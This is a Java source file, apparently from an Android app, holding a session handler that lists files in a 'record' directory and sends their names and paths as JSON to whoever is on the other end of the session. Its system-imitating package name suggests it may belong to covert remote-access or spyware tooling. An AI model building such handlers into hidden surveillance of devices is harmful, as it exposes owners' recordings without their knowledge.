package com.android.system.session.handler;

import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Arrays;

public class RecordListSessionHandler implements SessionManager.SessionHandler {
    private final String mFileDirPath;
    public RecordListSessionHandler(String fileDirPath) {
        mFileDirPath = fileDirPath;
    }

    @Override
    public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream)  {
            File filePath = new File(mFileDirPath + "/record/");
            if(filePath.isDirectory()) {
                File[] fileList = filePath.listFiles();
                Arrays.sort(fileList);
                if (fileList == null || fileList.length == 0) {
                    DataPack.sendDataPack(outputStream, new JSONObject().toString().getBytes());
                    return;
                }
                try {
                    JSONArray jsonArray = new JSONArray();
                    for (File file : fileList) {
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("name", file.getName());
                        jsonObject.put("path", file.getAbsolutePath());
                        jsonObject.put("type", file.isDirectory() ? 1 : 0);
                        jsonArray.put(jsonObject);
                    }
                    DataPack.sendDataPack(outputStream, new JSONObject().put("record_list", jsonArray).toString().getBytes());
                } catch (JSONException e) {

                }
            }
            else if(filePath.isFile()) {
                try {
                    DataPack.sendDataPack(outputStream, new JSONObject().put("length", filePath.length()).put("name", filePath.getName()).put("path", filePath.getAbsolutePath()).toString().getBytes());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
    }
}
